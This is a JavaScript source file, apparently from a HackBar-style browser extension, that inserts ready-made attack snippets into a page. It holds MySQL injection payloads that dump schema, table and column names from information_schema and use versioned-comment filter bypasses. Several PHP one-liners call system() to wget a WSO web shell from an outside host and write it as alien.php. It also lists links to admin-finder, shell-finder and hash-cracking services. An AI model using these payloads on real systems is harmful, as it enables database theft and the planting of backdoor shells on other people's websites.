HackBar.VM = {

	VariableMethod: function (choice)	{
		var str = choice;
		switch (str){
			case 'VARIABLE METHODS1': txt = "(SELECT(@y)FROM(SELECT(@y:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.SCHEMATA)WHERE(SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)AND(0x00)IN(@y:=CONCAT(@y,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,schema_name,0x3c62723e))))y)";
					break;
			case 'VARIABLE METHODS2': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.schemata)where(schema_name!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)and(@)in(@:=concat(@,@x:=@x%2b1))))x)";
					break;
			case 'VARIABLE METHODS3': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.tables)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;
			case 'VARIABLE METHODS4': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.columns)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;
			case 'VARIABLE METHODS5': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.tables)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
			case 'VARIABLE METHODS6': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.columns)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
//LINKS			
	case 'LINKS1': txt = "https://www.alienposts.com/";
					break;
	case 'LINKS2': txt = "XXX";
					break;
	case 'LINKS3': txt = "http://www.exploit-db.com/";
					break;
	case 'LINKS4': txt = "https://github.com/";
					break;		
	case 'LINKS5': txt = "http://www.securityidiots.com/";
					break;
	case 'LINKS6': txt = "http://leettime.net/sqlninja.com/";
					break;				
	case 'LINKS7': txt = "https://drive.google.com/open?id=1uZT1-O8JhTPpZlVhk_HpqCdUmulWRfW2";
					break;
	case 'LINKS8': txt = "https://drive.google.com/open?id=17Yz9jaAzlqOOiHxhqXfowDPWZ4MjTyYi";
					break;
	case 'LINKS9': txt = "https://drive.google.com/open?id=10PwWO_mEhW5BKyKZ-9u6_yLVxgypj-K_";
					break;
	case 'LINKS10': txt = "https://drive.google.com/open?id=1uOCLnrv41X7oPMNluNW6cRYQhLxa9deB";
					break;
	case 'LINKS11': txt = "https://drive.google.com/open?id=1uQagW36caSsMjzw_gW1lC3NomyimTZsK";
					break;
	case 'LINKS12': txt = "https://drive.google.com/open?id=1nJZAqB2hPk8UDKkqoxUt03bZ15Cv7j3c";
					break;	
	case 'LINKS13': txt = "https://drive.google.com/open?id=1vPmFYb-sOeqf_ljoPey85K-bdlkdEU9B";
					break;
	case 'LINKS14': txt = "https://drive.google.com/open?id=1Ui8NgIHMNI4JjituEkZHHo-98RGuR295";
					break;				
	case 'LINKS15': txt = "https://addons.mozilla.org/en-US/firefox/addon/green-text-on-black/?src=search";
					break;
	
	case 'LINKS16': txt = "https://viewdns.info/";
					break;
	case 'LINKS17': txt = "https://hashkiller.co.uk/md5-decrypter.aspx";
					break;
	case 'LINKS18': txt = "https://hashkiller.co.uk/sha1-decrypter.aspx";
					break;
	case 'LINKS19': txt = "https://www.hexsploit.web.id/admin-finder";
					break;
	case 'LINKS20': txt = "https://ip8.com/";
					break;	
	case 'LINKS21': txt = "https://www.hexsploit.web.id/shell-finder";
					break;				
	case 'LINKS22': txt = "https://dark-tools.ooo/";
					break;
	case 'LINKS23': txt = "https://endecoder.hexsploit.web.id/";
					break;			
	case 'LINKS24': txt = "https://www.hexsploit.web.id/index?tools=hashid";
					break;	
	case 'LINKS25': txt = "https://www.hexsploit.web.id/index?tools=whois";
					break;					




//scripts

case 'script1':
					   var alienscript = prompt("[#]======Block Shell Backdoor With htaccess======[#]\n1. In Site directory find the file htaccess \n2. goto EDIT \n3.Paste This Script In htaccess \n4. Save It. \n COPY AND PASTE THIS SCRIPT IN htaccess file ",'<FilesMatch "\\.(PHP|php5|phtml)$"> Order Allow,Deny  Deny from all</FilesMatch>');
					   txt = "" + alienscript + "";
					break;	



	//// shell

	case 'PHP1': txt = "<?system ('wget http://www.alientext.tk/wso.txt -o alien.php');?>";
					break;
	case 'PHP2': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;
    case 'PHP3': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;
	case 'PHP4': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;	
	case 'PHP5': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;
	case 'ASP1': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;	
	case 'ASP2': txt = "<?system ('wget http://www.alientext.tk/wso.txt -o alien.php');?>";
					break;
	case 'ASP3': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;
    case 'ASP4': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;
	case 'ASP5': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;	
	case 'SHTML1': txt = "<?system ('wget http://www.alientext.tk/shtml.txt -o alien.shtml');?>";
					break;





// FIND IT

		case 'Find It': txt = "/*!60000 integer version=6<!*/ /*!50000 integer version=5<!*/ /*!40000 integer version=4<!*/ /*!30000 integer version=3<!*/  ' /*!60000 string version=6<!*/ /*!50000 string version=5<!*/ /*!40000 string version=4<!*/ /*!30000 string version=3<!*/";
					break;

		}
		hackBar.setSelectedText( txt );
	  }

}
